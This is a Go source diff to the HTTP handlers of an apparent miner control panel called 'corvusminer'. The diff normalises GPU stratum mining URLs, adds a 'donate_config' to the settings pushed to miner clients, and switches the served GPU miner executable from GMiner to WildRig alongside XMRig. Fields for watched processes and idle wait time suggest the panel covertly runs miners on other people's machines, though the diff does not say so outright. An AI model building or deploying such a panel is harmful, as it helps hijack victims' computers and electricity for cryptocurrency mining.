@@ -2,6 +2,7 @@ package handlers
 
 import (
 	"corvusminer/panel/database"
+	"corvusminer/panel/donation"
 	"corvusminer/panel/models"
 	"corvusminer/panel/session"
 	"encoding/json"
@@ -50,6 +51,30 @@ func formatUptimeFunc(minutes int) string {
 		return fmt.Sprintf("%dh %dm", hours, mins)
 	}
 	return fmt.Sprintf("%dm", mins)
+}
+
+// formatMiningURL normalizes a GPU mining address for the selected algorithm.
+// pearlhash pools are served by bare host:port (no scheme); every other algo
+// gets stratum+tcp:// (or stratum+tcps:// when useSSL is set). Any scheme the
+// user may have typed is stripped and replaced with the correct one.
+func formatMiningURL(algo, rawURL string, useSSL int) string {
+	rawURL = strings.TrimSpace(rawURL)
+	for _, prefix := range []string{"stratum+ssl://", "stratum+tcps://", "stratum+tcp://"} {
+		if strings.HasPrefix(rawURL, prefix) {
+			rawURL = strings.TrimPrefix(rawURL, prefix)
+			break
+		}
+	}
+	if rawURL == "" {
+		return ""
+	}
+	if algo == "pearlhash" {
+		return rawURL
+	}
+	if useSSL == 1 {
+		return "stratum+tcps://" + rawURL
+	}
+	return "stratum+tcp://" + rawURL
 }
 
 // Handler handles all HTTP requests
@@ -399,12 +424,26 @@ func (h *Handler) UpdateConfig(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Build GPU config JSON
+	// Build GPU config JSON. The mining URL scheme is normalised from the
+	// selected algorithm (pearlhash = bare host:port, others = stratum+tcp[s]://).
+	gpuAlgo, _ := data["gpu_algo"].(string)
+	gpuMiningURL, _ := data["gpu_mining_url"].(string)
+	gpuUseSSL := 0
+	switch v := data["gpu_use_ssl"].(type) {
+	case float64:
+		if v != 0 {
+			gpuUseSSL = 1
+		}
+	case bool:
+		if v {
+			gpuUseSSL = 1
+		}
+	}
 	gpuConfig := map[string]interface{}{
-		"mining_url":     data["gpu_mining_url"],
+		"mining_url":     formatMiningURL(gpuAlgo, gpuMiningURL, gpuUseSSL),
 		"wallet":         data["gpu_wallet"],
 		"password":       data["gpu_password"],
-		"algo":           data["gpu_algo"],
+		"algo":           gpuAlgo,
 		"fan_speed":      data["gpu_fan_speed"],
 		"wait_time_idle": data["wait_time_idle"],
 		"use_ssl":        data["gpu_use_ssl"],
@@ -423,7 +462,7 @@ func (h *Handler) UpdateConfig(w http.ResponseWriter, r *http.Request) {
 	// Update config with JSON strings and enable flags
 	cfg.CPUConfig = string(cpuJSON)
 	cfg.GPUConfig = string(gpuJSON)
-	cfg.GPUAlgo = fmt.Sprintf("%v", data["gpu_algo"])
+	cfg.GPUAlgo = gpuAlgo
 
 	// Parse enable flags
 	if enable, ok := data["cpu_enabled"].(bool); ok && enable {
@@ -520,6 +559,7 @@ func (h *Handler) MinerSubmit(w http.ResponseWriter, r *http.Request) {
 		"enable_cpu":        cfg.EnableCPU,
 		"enable_gpu":        cfg.EnableGPU,
 		"watched_processes": watchedArr,
+		"donate_config":     donation.Map(),
 		"timestamp":         time.Now().Unix(),
 	}
 
@@ -592,22 +632,22 @@ func (h *Handler) ServeXMRig(w http.ResponseWriter, r *http.Request) {
 	log.Printf("Served XMRig binary to: %s", r.RemoteAddr)
 }
 
-// ServeGMiner serves the GMiner binary
-func (h *Handler) ServeGMiner(w http.ResponseWriter, r *http.Request) {
-	resourcePath := filepath.Join(h.baseDir, "static", "resources", "gminer.exe")
+// ServeWildrig serves the WildRig binary
+func (h *Handler) ServeWildrig(w http.ResponseWriter, r *http.Request) {
+	resourcePath := filepath.Join(h.baseDir, "static", "resources", "wildrig.exe")
 
 	// Check if file exists
 	if _, err := os.Stat(resourcePath); os.IsNotExist(err) {
-		log.Printf("GMiner binary not found at: %s", resourcePath)
-		http.Error(w, "GMiner binary not found", http.StatusNotFound)
+		log.Printf("WildRig binary not found at: %s", resourcePath)
+		http.Error(w, "WildRig binary not found", http.StatusNotFound)
 		return
 	}
 
 	// Open file
 	file, err := os.Open(resourcePath)
 	if err != nil {
-		log.Printf("Error opening GMiner binary: %v", err)
-		http.Error(w, "Error reading GMiner binary", http.StatusInternalServerError)
+		log.Printf("Error opening WildRig binary: %v", err)
+		http.Error(w, "Error reading WildRig binary", http.StatusInternalServerError)
 		return
 	}
 	defer file.Close()
@@ -615,23 +655,23 @@ func (h *Handler) ServeGMiner(w http.ResponseWriter, r *http.Request) {
 	// Get file info for size
 	fileInfo, err := file.Stat()
 	if err != nil {
-		log.Printf("Error getting GMiner file info: %v", err)
-		http.Error(w, "Error reading GMiner binary", http.StatusInternalServerError)
+		log.Printf("Error getting WildRig file info: %v", err)
+		http.Error(w, "Error reading WildRig binary", http.StatusInternalServerError)
 		return
 	}
 
 	// Set headers
-	w.Header().Set("Content-Disposition", "attachment; filename=gminer.exe")
+	w.Header().Set("Content-Disposition", "attachment; filename=wildrig.exe")
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))
 
 	// Send file
 	if _, err := io.Copy(w, file); err != nil {
-		log.Printf("Error sending GMiner binary: %v", err)
+		log.Printf("Error sending WildRig binary: %v", err)
 		return
 	}
 
-	log.Printf("Served GMiner binary to: %s", r.RemoteAddr)
+	log.Printf("Served WildRig binary to: %s", r.RemoteAddr)
 }
 
 // UpdatesPage handles displaying the updates management page
